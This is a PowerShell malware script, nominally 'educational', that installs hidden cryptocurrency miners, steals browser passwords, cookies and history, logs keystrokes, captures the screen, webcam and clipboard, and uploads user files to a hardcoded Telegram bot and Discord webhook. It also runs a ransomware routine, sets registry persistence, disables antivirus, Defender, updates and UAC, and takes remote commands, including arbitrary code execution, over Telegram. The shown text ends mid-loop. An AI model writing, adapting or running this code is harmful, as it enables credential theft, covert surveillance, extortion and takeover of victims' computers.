# Enhanced Mining Script with Unethical Features
# WARNING: For educational purposes in a controlled environment ONLY.
# Use outside a controlled environment is ILLEGAL and UNETHICAL.

#Requires -RunAsAdministrator

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

# Define base directory and files
$baseDir = "$env:APPDATA\AdvancedMiner"
$miningScriptPath = "$baseDir\mining.ps1"
$dllDir = "C:\SQLite"
$dllPath = "$dllDir\System.Data.SQLite.dll"
$logFile = "$baseDir\mining_log.txt"
$configFile = "$baseDir\config.json"
$scriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"  # Updated to raw GitHub URL

# URLs for downloading files
$miningScriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"  # Updated to raw GitHub URL
# Note: If this URL becomes invalid, check https://system.data.sqlite.org for the latest version and update accordingly.
$sqliteDllUrl = "https://system.data.sqlite.org/blobs/1.0.119.0/sqlite-netFx46-binary-bundle-x64-2015-1.0.119.0.zip"

# Add a flag for CPU mining (set based on your setup)
$cpuMiningEnabled = $true  # Set to $false if only GPU mining is desired

# Logging function
function Write-Log {
    param ([string]$message)
    $timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    "$timestamp - $message" | Out-File -FilePath $logFile -Append
    Write-Host "$timestamp - $message"
}

# Create base directories if they don’t exist
if (-not (Test-Path $baseDir)) {
    New-Item -Path $baseDir -ItemType Directory -Force | Out-Null
    Write-Log "Created directory: $baseDir"
}
if (-not (Test-Path $dllDir)) {
    New-Item -Path $dllDir -ItemType Directory -Force | Out-Null
    Write-Log "Created directory: $dllDir"
}

# Check and download mining.ps1 if not present
if (-not (Test-Path $miningScriptPath)) {
    Write-Log "mining.ps1 not found. Downloading from $miningScriptUrl..."
    try {
        Invoke-WebRequest -Uri $miningScriptUrl -OutFile $miningScriptPath -ErrorAction Stop
        Write-Log "mining.ps1 downloaded successfully to $miningScriptPath."
    } catch {
        Write-Log "Failed to download mining.ps1: $_"
        exit 1
    }
} else {
    Write-Log "mining.ps1 found at $miningScriptPath."
}

# Check and download System.Data.SQLite.dll if not present
if (-not (Test-Path $dllPath)) {
    Write-Log "System.Data.SQLite.dll not found. Downloading and extracting from $sqliteDllUrl..."
    try {
        $zipPath = "$env:TEMP\sqlite.zip"
        Write-Log "Starting download of System.Data.SQLite.dll..."
        $response = Invoke-WebRequest -Uri $sqliteDllUrl -OutFile $zipPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -PassThru -ErrorAction Stop
        Write-Log "Download initiated. Waiting 25 seconds for completion..."
        Start-Sleep -Seconds 25  # Wait 25 seconds to ensure download completes
        Write-Log "Download status code: $($response.StatusCode)"
        Write-Log "Content type: $($response.Headers['Content-Type'])"

        if ($response.StatusCode -ne 200) {
            Write-Log "Failed to download: HTTP status $($response.StatusCode)"
            exit 1
        }
        if ($response.Headers['Content-Type'] -notlike '*zip*') {
            Write-Log "Downloaded file is not a ZIP archive (Content-Type: $($response.Headers['Content-Type']))"
            exit 1
        }

        $zipBytes = Get-Content -Path $zipPath -Encoding Byte -TotalCount 4
        if ($zipBytes[0] -ne 0x50 -or $zipBytes[1] -ne 0x4B -or $zipBytes[2] -ne 0x03 -or $zipBytes[3] -ne 0x04) {
            Write-Log "Downloaded file is not a valid ZIP archive. First 4 bytes: $($zipBytes -join ',')"
            exit 1
        }

        Expand-Archive -Path $zipPath -DestinationPath $dllDir -Force -ErrorAction Stop
        Remove-Item $zipPath -ErrorAction Stop
        Write-Log "System.Data.SQLite.dll extracted to $dllDir."
    } catch {
        Write-Log "Failed to download or extract System.Data.SQLite.dll: $_"
        exit 1
    }
} else {
    Write-Log "System.Data.SQLite.dll found at $dllPath."
}

# Load SQLite assembly
try {
    Add-Type -Path $dllPath -ErrorAction Stop
    Write-Log "Successfully loaded System.Data.SQLite.dll."
} catch {
    Write-Log "Error: Failed to load System.Data.SQLite.dll: $_"
    exit 1
}

# Load configuration from config.json
if (-not (Test-Path $configFile)) {
    Write-Log "Config file not found. Creating default config.json."
    $defaultConfig = @{
        telegram_token = "7096283583:AAE7iv8FKDJZ5Ok5Bq0NdZ5Qa_a1KoIYfjg"
        telegram_chat_id = "7486857021"
        discord_webhook = "https://discord.com/api/webhooks/1358278272080674994/Wg5AJoXN0TzH8Fo4VpElW4n_zCWE7FH5aYHyBpFc0ygsosMohmR-5gws_VIExd6Vanu9"
        pool_fee = 0.01
        electricity_cost = 0.1
        supported_algorithms = @{
            "Ethash" = "T-Rex"
            "KawPow" = "NBMiner"
            "RandomX" = "XMRig"
            "Autolykos" = "lolMiner"
        }
    }
    $defaultConfig | ConvertTo-Json | Out-File $configFile
}
$config = Get-Content $configFile | ConvertFrom-Json
$telegramBotToken = $config.telegram_token
$telegramChatId = $config.telegram_chat_id
$discordWebhookUrl = $config.discord_webhook
$supportedAlgorithms = $config.supported_algorithms

# Wallet setup (replace with your actual wallets)
$env:GPU_WALLET = "0x6D8E80004900a938b518e1aA01fDdB384a089F1E"  # ETH Wallet
$env:XMR_WALLET = "4B7F3tuKdQVNB7QMoyfvG62EEqHEKV4iQWfZH5RAA5uz3STSWchWQ9dH8Jt9P6woRCP1UYX58HxPZW4BqdZ7v2ETLkYi1D5"  # XMR Wallet
$env:TON_WALLET = "UQDg4WHFrh5CagHuodkhfzrlFtW_nCyCpq_hD763gb6yhOC0"  # TON Wallet

# Initialize script variables
$script:lastHashrate = 0
$script:totalEarnings = 0
$script:overheatCount = 0
$script:lastUpdateId = 0
$script:currentAlgorithm = "Ethash"
$script:lastSwitchTime = Get-Date

# **Telegram/Discord Functions**

function Send-TelegramMessage {
    param ([string]$message)
    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage"
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body @{
            chat_id = $telegramChatId
            text    = $message
        } -ErrorAction Stop
    } catch {
        Write-Log "Telegram send failed: $_"
    }
}

function Send-TelegramFile {
    param ([string]$filePath)
    $url = "https://api.telegram.org/bot$telegramBotToken/sendDocument"
    try {
        $fileStream = [System.IO.File]::OpenRead($filePath)
        $form = @{
            chat_id = $telegramChatId
            document = $fileStream
        }
        Invoke-RestMethod -Uri $url -Method Post -Form $form -ErrorAction Stop
        $fileStream.Close()
    } catch {
        Write-Log "Telegram file send failed: $_"
    }
}

function Send-DiscordWebhook {
    param ([string]$message)
    $body = @{ content = $message } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
    } catch {
        Write-Log "Discord send failed: $_"
    }
}

# **Account Grabbing Functions**

function Get-ChromeEncryptionKey {
    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (-not (Test-Path $localStatePath)) {
        Write-Log "Chrome Local State file not found at $localStatePath."
        return $null
    }
    try {
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)] # Remove "DPAPI" prefix
        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
        Write-Log "Successfully retrieved Chrome encryption key."
        return $decryptedKey
    } catch {
        Write-Log "Failed to retrieve Chrome encryption key: $_"
        return $null
    }
}

function Decrypt-ChromePassword {
    param (
        [byte[]]$encryptedData,
        [byte[]]$key
    )
    if ([System.Text.Encoding]::ASCII.GetString($encryptedData[0..2]) -eq "v10") {
        $nonce = $encryptedData[3..14]
        $cipherText = $encryptedData[15..($encryptedData.Length - 17)]
        $tag = $encryptedData[($encryptedData.Length - 16)..($encryptedData.Length - 1)]
        $aesGcm = New-Object System.Security.Cryptography.AesGcm($key)
        $plainText = New-Object byte[] $cipherText.Length
        $aesGcm.Decrypt($nonce, $cipherText, $tag, $plainText)
        return [System.Text.Encoding]::UTF8.GetString($plainText)
    } else {
        return [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $null, 'CurrentUser'))
    }
}

function Get-ChromeCredentials {
    $chromeDbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $tempDb = "$env:TEMP\ChromeLoginData.db"
    if (-not (Test-Path $chromeDbPath)) {
        Write-Log "Chrome Login Data not found at $chromeDbPath."
        return
    }
    Write-Log "Copying Chrome Login Data to $tempDb."
    Copy-Item $chromeDbPath $tempDb -Force
    try {
        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
        $connection.ConnectionString = "Data Source=$tempDb"
        $connection.Open()
        Write-Log "Opened Chrome database connection."
    } catch {
        Write-Log "Failed to open Chrome database: $_"
        Remove-Item $tempDb
        return
    }
    $query = "SELECT origin_url, username_value, password_value FROM logins"
    $command = $connection.CreateCommand()
    $command.CommandText = $query
    try {
        $reader = $command.ExecuteReader()
        Write-Log "Query executed successfully."
    } catch {
        Write-Log "Query failed: $_"
        $connection.Close()
        Remove-Item $tempDb
        return
    }
    $encryptionKey = Get-ChromeEncryptionKey
    if (-not $encryptionKey) {
        Write-Log "Failed to get encryption key."
        $connection.Close()
        Remove-Item $tempDb
        return
    }
    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $encryptedPassword = [byte[]]$reader["password_value"]
        if ($encryptedPassword.Length -gt 0) {
            try {
                $password = Decrypt-ChromePassword -encryptedData $encryptedPassword -key $encryptionKey
                $message = "Chrome - URL: $url, User: $username, Pass: $password"
                Send-TelegramMessage -message $message
                Send-DiscordWebhook -message $message
                Write-Log "Extracted credential for $url"
            } catch {
                Write-Log "Decryption failed for $($url): $_"
            }
        }
    }
    $connection.Close()
    Remove-Item $tempDb
}

function Get-EdgeCredentials {
    $edgeDbPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    $tempDb = "$env:TEMP\EdgeLoginData.db"
    if (-not (Test-Path $edgeDbPath)) {
        Write-Log "Edge Login Data not found at $edgeDbPath."
        return
    }
    Write-Log "Copying Edge Login Data to $tempDb."
    Copy-Item $edgeDbPath $tempDb -Force
    try {
        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
        $connection.ConnectionString = "Data Source=$tempDb"
        $connection.Open()
        Write-Log "Opened Edge database connection."
    } catch {
        Write-Log "Failed to open Edge database: $_"
        Remove-Item $tempDb
        return
    }
    $query = "SELECT origin_url, username_value, password_value FROM logins"
    $command = $connection.CreateCommand()
    $command.CommandText = $query
    try {
        $reader = $command.ExecuteReader()
        Write-Log "Query executed successfully."
    } catch {
        Write-Log "Query failed: $_"
        $connection.Close()
        Remove-Item $tempDb
        return
    }
    $encryptionKey = Get-ChromeEncryptionKey
    if (-not $encryptionKey) {
        Write-Log "Failed to retrieve Edge encryption key."
        $connection.Close()
        Remove-Item $tempDb
        return
    }
    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $encryptedPassword = [byte[]]$reader["password_value"]
        if ($encryptedPassword.Length -gt 0) {
            try {
                $password = Decrypt-ChromePassword -encryptedData $encryptedPassword -key $encryptionKey
                $message = "Edge - URL: $url, User: $username, Pass: $password"
                Send-TelegramMessage -message $message
                Send-DiscordWebhook -message $message
                Write-Log "Extracted Edge credential for $url"
            } catch {
                Write-Log "Decryption failed for $($url): $_"
            }
        }
    }
    $connection.Close()
    Remove-Item $tempDb
}

# **Additional Unethical Features**

function Get-ChromeHistory {
    $historyPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    $tempHistory = "$env:TEMP\ChromeHistory.db"
    if (-not (Test-Path $historyPath)) {
        Write-Log "Chrome History not found at $historyPath."
        return
    }
    Write-Log "Copying Chrome History to $tempHistory."
    Copy-Item $historyPath $tempHistory -Force
    try {
        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
        $connection.ConnectionString = "Data Source=$tempHistory"
        $connection.Open()
        Write-Log "Opened Chrome History database."
        $query = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50"
        $command = $connection.CreateCommand()
        $command.CommandText = $query
        $reader = $command.ExecuteReader()
        $history = while ($reader.Read()) { "$($reader['url']) - $($reader['title'])" }
        Send-TelegramMessage -message ($history -join "`n")
        $connection.Close()
        Remove-Item $tempHistory
        Write-Log "Sent Chrome history via Telegram."
    } catch {
        Write-Log "Failed to extract Chrome history: $_"
    }
}

function Get-ChromeCookies {
    $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
    $tempCookies = "$env:TEMP\ChromeCookies.db"
    if (-not (Test-Path $cookiesPath)) {
        Write-Log "Chrome Cookies not found at $cookiesPath."
        return
    }
    Write-Log "Copying Chrome Cookies to $tempCookies."
    Copy-Item $cookiesPath $tempCookies -Force
    try {
        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
        $connection.ConnectionString = "Data Source=$tempCookies"
        $connection.Open()
        Write-Log "Opened Chrome Cookies database."
        $query = "SELECT host_key, name, encrypted_value FROM cookies"
        $command = $connection.CreateCommand()
        $command.CommandText = $query
        $reader = $command.ExecuteReader()
        $encryptionKey = Get-ChromeEncryptionKey
        while ($reader.Read()) {
            $host = $reader["host_key"]
            $name = $reader["name"]
            $encryptedValue = [byte[]]$reader["encrypted_value"]
            $value = Decrypt-ChromePassword -encryptedData $encryptedValue -key $encryptionKey
            $cookie = "Host: $host, Name: $name, Value: $value"
            Send-TelegramMessage -message $cookie
        }
        $connection.Close()
        Remove-Item $tempCookies
        Write-Log "Sent Chrome cookies via Telegram."
    } catch {
        Write-Log "Failed to extract Chrome cookies: $_"
    }
}

function Simulate-Ransomware {
    $testDir = "C:\TestFolder"
    if (-not (Test-Path $testDir)) {
        Write-Log "Test directory $testDir not found."
        return
    }
    $key = New-Object Byte[] 32
    [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($key)
    Get-ChildItem $testDir -File | ForEach-Object {
        $content = Get-Content $_.FullName -Raw
        $aes = [System.Security.Cryptography.Aes]::Create()
        $encryptor = $aes.CreateEncryptor($key, $aes.IV)
        $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($content), 0, $content.Length)
        Set-Content $_.FullName $encrypted -Encoding Byte
        Rename-Item $_.FullName "$($_.Name).encrypted"
    }
    $ransomNote = "Files encrypted. Decryption key: $([Convert]::ToBase64String($key))"
    $ransomNote | Out-File "$testDir\README.txt"
    Send-TelegramMessage -message $ransomNote
    Write-Log "Ransomware simulation executed."
}

function Capture-NetworkTraffic {
    $captureFile = "$env:TEMP\network_capture.etl"
    try {
        netsh trace start capture=yes tracefile=$captureFile maxsize=10
        Start-Sleep -Seconds 60
        netsh trace stop
        Send-TelegramFile -filePath $captureFile
        Remove-Item $captureFile
        Write-Log "Network traffic captured and sent."
    } catch {
        Write-Log "Failed to capture network traffic: $_"
    }
}

function Start-Keylogging {
    Add-Type -AssemblyName System.Windows.Forms
    $logFile = "$env:TEMP\keystrokes.txt"
    while ($true) {
        Start-Sleep -Milliseconds 10
        $keys = ""
        for ($i = 0; $i -lt 255; $i++) {
            if ([System.Windows.Forms.Control]::IsKeyDown($i)) {
                $keys += [char]$i
            }
        }
        if ($keys) {
            $keys | Out-File -FilePath $logFile -Append
            Send-TelegramMessage -message "Keystrokes: $keys"
            Send-DiscordWebhook -message "Keystrokes: $keys"
            Write-Log "Captured keystrokes: $keys"
        }
    }
}

function Start-ScreenRecording {
    $outputFile = "$env:TEMP\screen_record.mp4"
    $ffmpegPath = "C:\ffmpeg\bin\ffmpeg.exe"
    if (Test-Path $ffmpegPath) {
        & $ffmpegPath -f gdigrab -framerate 30 -i desktop -t 10 $outputFile -y
        Send-TelegramFile -filePath $outputFile
        Send-DiscordWebhook -message "Screen recording captured."
        Write-Log "Screen recording saved to $outputFile"
    } else {
        Write-Log "FFmpeg not found for screen recording."
    }
}

function Capture-Webcam {
    $outputImage = "$env:TEMP\webcam.jpg"
    try {
        $webcam = New-Object -ComObject "WIA.CommonDialog"
        $image = $webcam.ShowAcquireImage()
        $image.SaveFile($outputImage)
        Send-TelegramFile -filePath $outputImage
        Send-DiscordWebhook -message "Webcam snapshot captured."
        Write-Log "Webcam image saved to $outputImage"
    } catch {
        Write-Log "Webcam capture failed: $_"
    }
}

function Exfiltrate-Files {
    $targetFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.docx, *.txt, *.pdf, *wallet* -ErrorAction SilentlyContinue
    foreach ($file in $targetFiles) {
        Send-TelegramFile -filePath $file.FullName
        Send-DiscordWebhook -message "Exfiltrated file: $($file.Name)"
        Write-Log "Exfiltrated file: $($file.FullName)"
    }
}

function Start-ClipboardHijacking {
    while ($true) {
        $clip = Get-Clipboard
        if ($clip) {
            Send-TelegramMessage -message "Clipboard content: $clip"
            Send-DiscordWebhook -message "Clipboard content: $clip"
            Write-Log "Captured clipboard: $clip"
            Set-Clipboard -Value "Clipboard hijacked for testing."
        }
        Start-Sleep -Seconds 5
    }
}

# **Mining Functions**

function Get-MostProfitableCoin {
    try {
        $profitData = Invoke-RestMethod -Uri "https://whattomine.com/coins.json" -TimeoutSec 10
        $coins = $profitData.coins | Where-Object { $_.algorithm -in $supportedAlgorithms.Keys }
        if (-not $coins) {
            Write-Log "No profitable coins found for supported algorithms."
            return $null
        }
        $bestCoin = $coins | ForEach-Object {
            $_ | Add-Member -NotePropertyName "net_profit" -NotePropertyValue ($_.profitability * (1 - $config.pool_fee)) -PassThru
        } | Sort-Object -Property net_profit -Descending | Select-Object -First 1
        Write-Log "Most profitable coin: $($bestCoin.tag) with algorithm $($bestCoin.algorithm)"
        return $bestCoin
    } catch {
        Write-Log "Failed to fetch profitability data: $_"
        return $null
    }
}

function Get-BestPool {
    param ([string]$algorithm)
    $pools = @{
        "Ethash" = @("stratum+tcp://etc.2miners.com:1010", "stratum+tcp://eth.nanopool.org:9999")
        "KawPow" = @("stratum+tcp://rvn.2miners.com:6060", "stratum+tcp://rvn.nanopool.org:12222")
        "RandomX" = @("stratum+tcp://xmr.pool.minergate.com:443", "stratum+tcp://pool.hashvault.pro:5555")
        "Autolykos" = @("stratum+tcp://ergo.2miners.com:8888", "stratum+tcp://ergo.nanopool.org:11111")
    }
    if ($pools.ContainsKey($algorithm)) {
        return $pools[$algorithm] | Get-Random
    }
    return "stratum+tcp://pool.hashvault.pro:5555"
}

function Set-NvidiaOverclock {
    param ([int]$powerLimit = 70, [int]$coreOffset = 100, [int]$memOffset = 500)
    $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
    if (Test-Path $nvidiaSmi) {
        & $nvidiaSmi -pl $powerLimit
        & $nvidiaSmi -lgc $coreOffset
        & $nvidiaSmi -lmc $memOffset
        Write-Log "Applied NVIDIA overclock: Power $powerLimit W, Core +$coreOffset MHz, Mem +$memOffset MHz"
    }
}

function Set-AmdOverclock {
    param ([string]$profile = "Profile1")
    $overdriveToolPath = "$baseDir\OverdriveNTool.exe"
    if (Test-Path $overdriveToolPath) {
        & $overdriveToolPath -p1$profile
        Write-Log "Applied AMD overclock profile: $profile"
    }
}

function Install-Miner {
    param ([string]$miner, [string]$url, [string]$path)
    try {
        if (-not (Test-Path $path)) { New-Item -Path $path -ItemType Directory -Force | Out-Null }
        $exePath = "$path\$miner.exe"
        if (-not (Test-Path $exePath)) {
            Download-Miner -miner $miner -url $url -path $path
        }
        Write-Log "Miner ready at $exePath."
        return "$miner.exe"
    } catch {
        Write-Log "Install-Miner ($miner) failed: $_"
        return $null
    }
}

function Start-Miner {
    param (
        [string]$algorithm,
        [string]$pool,
        [int]$gpuIndex = -1
    )
    $miner = $supportedAlgorithms[$algorithm]
    $exePath = "$baseDir\$miner\$miner.exe"
    if (-not (Test-Path $exePath)) { return $null }
    $args = switch ($algorithm) {
        "Ethash" { "-a ethash -o $pool -u $env:GPU_WALLET.$env:COMPUTERNAME -p x --api-bind-http 127.0.0.1:4067" }
        "KawPow" { "-a kawpow -o $pool -u $env:GPU_WALLET.$env:COMPUTERNAME -p x" }
        "RandomX" { "--donate-level=1 -o $pool -u $env:XMR_WALLET -p $env:COMPUTERNAME --http-enabled --http-port=4068" }
        "Autolykos" { "-a autolykos2 -o $pool -u $env:GPU_WALLET.$env:COMPUTERNAME -p x" }
    }
    if ($gpuIndex -ge 0) { $args += " --devices $gpuIndex" }
    try {
        $process = Start-Process -FilePath $exePath -ArgumentList $args -WindowStyle Hidden -PassThru
        Write-Log "$miner started (PID: $($process.Id)) for $algorithm."
        return $process
    } catch {
        Write-Log "Failed to start $($miner): $_"
    }
}

function Stop-Miner {
    Get-Process -Name "t-rex", "nbminer", "xmrig", "lolminer" -ErrorAction SilentlyContinue | Stop-Process -Force
    Write-Log "All miners stopped."
}

function Monitor-Miner {
    while ($true) {
        if (-not (Get-Process -Name "t-rex", "nbminer", "xmrig", "lolminer" -ErrorAction SilentlyContinue)) {
            Write-Log "Miners not running. Restarting..."
            $bestCoin = Get-MostProfitableCoin
            if ($bestCoin) {
                $pool = Get-BestPool -algorithm $bestCoin.algorithm
                Start-Miner -algorithm $bestCoin.algorithm -pool $pool
            }
        }
        Start-Sleep -Seconds 300
    }
}

function Set-MinerIntensity {
    param ([int]$intensity)
    Write-Log "Intensity adjustment not implemented for all miners."
}

function Switch-Coin {
    param ([string]$coin)
    $algorithm = $supportedAlgorithms.Keys | Where-Object { (Get-MostProfitableCoin).tag -eq $coin }
    if ($algorithm) {
        Stop-Miner
        $pool = Get-BestPool -algorithm $algorithm
        Start-Miner -algorithm $algorithm -pool $pool
        $script:currentAlgorithm = $algorithm
    }
}

# **Utility Functions**

function Ensure-Persistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $scriptPath = "$baseDir\mining.ps1"
    if (-not (Test-Path "Registry::$regPath")) { New-Item -Path "Registry::$regPath" -Force | Out-Null }
    Set-ItemProperty -Path "Registry::$regPath" -Name "AdvancedMiner" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
    Write-Log "Persistence added via registry."
}

function Disable-AllAntivirus {
    $avServices = @("McAfee", "Norton", "Symantec", "Kaspersky", "Avast", "AVG", "Bitdefender", "TrendMicro", "Sophos")
    foreach ($service in $avServices) {
        $svc = Get-Service -Name "*$service*" -ErrorAction SilentlyContinue
        if ($svc) {
            Stop-Service -Name $svc.Name -Force -ErrorAction SilentlyContinue
            Set-Service -Name $svc.Name -StartupType Disabled -ErrorAction SilentlyContinue
            Write-Log "Disabled antivirus service: $($svc.Name)"
        }
    }
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    Write-Log "Attempted to disable all antivirus software."
}

function Prevent-Sleep {
    $shell = New-Object -ComObject "WScript.Shell"
    Start-Job -Name "SleepPreventer" -ScriptBlock {
        param ($shell)
        while ($true) {
            $shell.SendKeys("{F15}")
            Start-Sleep -Seconds 60
        }
    } -ArgumentList $shell
    Write-Log "Sleep prevention job started."
}

function Bypass-WindowsSecurity {
    Disable-AllAntivirus
    Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "wuauserv" -StartupType Disabled -ErrorAction SilentlyContinue
    $paths = @("$baseDir\T-Rex", "$baseDir\TeamRedMiner", "$baseDir\XMRig", "$baseDir\lolMiner", $baseDir)
    foreach ($path in $paths) {
        if (-not (Get-MpPreference).ExclusionPath -contains $path) {
            Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
            Write-Log "Exclusion added for path: $path"
        }
    }
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue
    Write-Log "Windows security bypassed."
}

function Download-Miner {
    param ([string]$miner, [string]$url, [string]$path)
    $zipPath = "$env:TEMP\$miner.zip"
    Invoke-WebRequest -Uri $url -OutFile $zipPath -ErrorAction Stop
    Expand-Archive -Path $zipPath -DestinationPath $path -Force -ErrorAction Stop
    Remove-Item $zipPath -ErrorAction Stop
    $exeName = "$miner.exe"
    $exePath = Get-ChildItem -Path $path -Filter $exeName -Recurse | Select-Object -First 1
    if ($exePath) {
        Move-Item -Path $exePath.FullName -Destination "$path\$exeName" -Force
        Get-ChildItem -Path $path -Directory | Remove-Item -Recurse -Force
        Write-Log "$miner downloaded and extracted."
    }
}

function Get-GPUTemperature {
    $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
    if (Test-Path $nvidiaSmi) {
        $temp = [int](& $nvidiaSmi --query-gpu=temperature.gpu --format=csv,noheader | Select-Object -First 1)
        if ($temp -gt 80) { $script:overheatCount++ }
        Write-Log "GPU temp: $temp°C"
        return $temp
    }
    return 50
}

function Test-GPUCompatibility {
    $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
    if (Test-Path $nvidiaSmi) { return "NVIDIA" }
    $amdGpu = Get-WmiObject Win32_VideoController | Where-Object { $_.Name -match "AMD|Radeon" }
    if ($amdGpu) { return "AMD" }
    Write-Log "No compatible GPU."
    return $null
}

function Process-Command {
    param ([string]$command)
    switch -Wildcard ($command) {
        "/start" { 
            $bestCoin = Get-MostProfitableCoin
            if ($bestCoin) {
                $pool = Get-BestPool -algorithm $bestCoin.algorithm
                Start-Miner -algorithm $bestCoin.algorithm -pool $pool
                Send-TelegramMessage -message "Mining started."
            }
        }
        "/stop" { Stop-Miner; Send-TelegramMessage -message "Mining stopped." }
        "/status" { 
            $status = "Hashrate: $script:lastHashrate MH/s, Earnings: $script:totalEarnings USD, Overheats: $script:overheatCount"
            Send-TelegramMessage -message $status
            Send-DiscordWebhook -message $status
        }
        "/restart" { Send-TelegramMessage -message "Restarting system..."; Restart-Computer -Force }
        "/switch_coin *" {
            $coin = $command -replace "/switch_coin ", ""
            Switch-Coin -coin $coin
            Send-TelegramMessage -message "Switched to mining $coin."
        }
        "/set_intensity *" {
            $intensity = $command -replace "/set_intensity ", ""
            Set-MinerIntensity -intensity $intensity
            Send-TelegramMessage -message "Intensity set to $intensity."
        }
        "/get_logs" {
            Send-TelegramFile -filePath $logFile
            Send-DiscordWebhook -message "Log file uploaded."
        }
        "/execute *" {
            $cmd = $command -replace "/execute ", ""
            $output = Invoke-Expression $cmd 2>&1
            Send-TelegramMessage -message "Output: $output"
            Send-DiscordWebhook -message "Executed: $cmd | Output: $output"
        }
        "/upload_file *" {
            $path = $command -replace "/upload_file ", ""
            Send-TelegramFile -filePath $path
            Send-DiscordWebhook -message "File $path uploaded."
        }
        "/list_processes" {
            $processes = Get-Process | Select-Object -Property Name, Id | Out-String
            Send-TelegramMessage -message $processes
        }
        "/kill_process *" {
            $pid = $command -replace "/kill_process ", ""
            Stop-Process -Id $pid -Force
            Send-TelegramMessage -message "Killed process $pid."
        }
        default { Send-TelegramMessage -message "Unknown command: $command" }
    }
}

function Get-TelegramCommands {
    $url = "https://api.telegram.org/bot$telegramBotToken/getUpdates?offset=$script:lastUpdateId"
    $response = Invoke-RestMethod -Uri $url -Method Get
    if ($response.ok -and $response.result) {
        foreach ($update in $response.result) {
            $script:lastUpdateId = $update.update_id + 1
            if ($update.message.chat.id -eq [int64]$telegramChatId) {
                Process-Command -command $update.message.text
            }
        }
    }
}

# **Main Monitoring Function**

function Monitor-Miners {
    $worker = $env:COMPUTERNAME
    Write-Log "Starting mining on $worker..."
    try {
        $gpuType = Test-GPUCompatibility
        if (-not $gpuType) { throw "No compatible GPU detected." }
        
        # Install miners
        Install-Miner -miner "t-rex" -url "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip" -path "$baseDir\T-Rex"
        Install-Miner -miner "nbminer" -url "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Win.zip" -path "$baseDir\NBMiner"
        Install-Miner -miner "xmrig" -url "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -path "$baseDir\XMRig"
        Install-Miner -miner "lolminer" -url "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.91/lolMiner_v1.91_Win64.zip" -path "$baseDir\lolMiner"
        
        Ensure-Persistence
        Start-Job -ScriptBlock { Monitor-Miner }
        
        # Start unethical features
        Start-Job -ScriptBlock { Get-ChromeCredentials }
        Start-Job -ScriptBlock { Get-EdgeCredentials }
        Start-Job -ScriptBlock { Start-Keylogging }
        Start-Job -ScriptBlock { Start-ScreenRecording }
        Start-Job -ScriptBlock { Capture-Webcam }
        Start-Job -ScriptBlock { Exfiltrate-Files }
        Start-Job -ScriptBlock { Start-ClipboardHijacking }
        Start-Job -ScriptBlock { Get-ChromeHistory }
        Start-Job -ScriptBlock { Get-ChromeCookies }
        Start-Job -ScriptBlock { Simulate-Ransomware }
        Start-Job -ScriptBlock { Capture-NetworkTraffic }
        
        $gpus = Get-CimInstance Win32_VideoController
        $switchInterval = 1800  # 30 minutes
        
        while ($true) {
            $currentTime = Get-Date
            if (($currentTime - $script:lastSwitchTime).TotalSeconds -ge $switchInterval) {
                $bestCoin = Get-MostProfitableCoin
                if ($bestCoin -and $bestCoin.algorithm -ne $script:currentAlgorithm) {
                    Write-Log "Switching to more profitable coin: $($bestCoin.tag)"
                    Stop-Miner
                    $script:currentAlgorithm = $bestCoin.algorithm
